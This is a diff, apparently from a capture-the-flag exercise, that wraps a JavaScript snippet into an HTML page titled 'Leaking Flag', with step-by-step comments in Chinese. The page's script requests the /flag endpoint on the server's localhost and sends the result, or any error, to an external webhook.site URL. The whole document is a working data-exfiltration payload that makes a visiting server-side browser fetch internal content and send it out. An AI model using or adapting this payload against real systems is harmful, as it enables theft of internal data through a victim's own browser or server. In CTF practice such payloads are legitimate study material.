@@ -1,6 +1,23 @@
-fetch('http://127.0.0.1:3000/flag')
-  .then(response => response.text())
-  .then(flag => {
-    // 將 flag 傳送到你的 webhook
-    fetch('https://webhook.site/b2bfa91b-d977-44f4-9e00-554f7e52ddbb?flag=' + encodeURIComponent(flag));
-  });
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Leaking Flag</title>
+</head>
+<body>
+    <script>
+        // 1. 在伺服器本地請求 flag
+        fetch('http://127.0.0.1:3000/flag')
+          .then(response => response.text()) // 2. 將回應轉為文字
+          .then(flag => {
+            // 3. 將獲取到的 flag 傳送到你的 webhook
+            //    記得換成你自己的 Webhook URL
+            fetch('https://webhook.site/b2bfa91b-d977-44f4-9e00-554f7e52ddbb?flag=' + encodeURIComponent(flag));
+          })
+          .catch(error => {
+            // 可以在出錯時也發送一個通知，方便除錯
+            fetch('https://webhook.site/b2bfa91b-d977-44f4-9e00-554f7e52ddbb?error=' + encodeURIComponent(error.message));
+          });
+    </script>
+    <p>Leaking in progress...</p>
+</body>
+</html>
